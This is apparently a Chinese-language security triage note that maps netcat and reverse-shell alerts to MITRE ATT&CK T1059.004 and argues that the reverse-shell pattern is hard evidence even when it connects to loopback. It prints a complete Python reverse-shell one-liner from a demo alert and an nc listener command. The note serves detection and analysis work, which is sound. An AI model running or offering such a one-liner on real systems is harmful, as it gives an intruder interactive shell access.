# SC-06 · 反弹 Shell = Unix Shell 执行

> MITRE ATT&CK T1059.004 Command and Scripting Interpreter: Unix Shell：
> 「Adversaries may abuse Unix shell commands and scripts for execution.」
> Elastic Security（同上，netcat 规则）：
> 「Netcat is often used as a **persistence mechanism by exporting a reverse shell
> or by serving a shell on a listening port**. Netcat is also sometimes used for
> **data exfiltration**.」

**含义**：`nc -lp 4444` 单独看是「开了个监听」。但 Elastic 明确列了三种恶意用法：

1. 导出反弹 shell
2. 在监听端口上提供 shell
3. 数据外传

**推论**：判 `nc` 的时候，问的是「**这个监听有没有连上外网 / 有没有交互**」，
而不是「有没有 nc」。

## 反弹 shell 的**形态本身就是硬证据**

demo 里的真实样本（`python3 -c import socket,subprocess,os;...s.connect(('127.0.0.1',4325));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i'])`）：

- `socket` + `subprocess` + `os.dup2` 三个一起出现
- `dup2` 把 socket 绑到 **0/1/2**（stdin/stdout/stderr）
- 最后 `subprocess.call(['/bin/bash','-i'])` —— 起一个交互式 shell

**这套组合没有任何正当用途。** 它是**反弹 shell 的标准写法**，脚本化的、
逐字复制的、不可能手写出来的。

**⚠️ 连接的是 `127.0.0.1`（回环）不能当良性证据。**
demo 里它连回环，是因为所有告警都来自同一台探针机（172.20.208.23），
攻击者已经在机器内部了，从本机发起回环很常见（容器内、隧道、本机代理）。

**所以：反弹 shell 形态完整 = 硬证据，不因为目标是回环地址而降级。**
要区分的是「**形态**」，不是「连到了哪」。
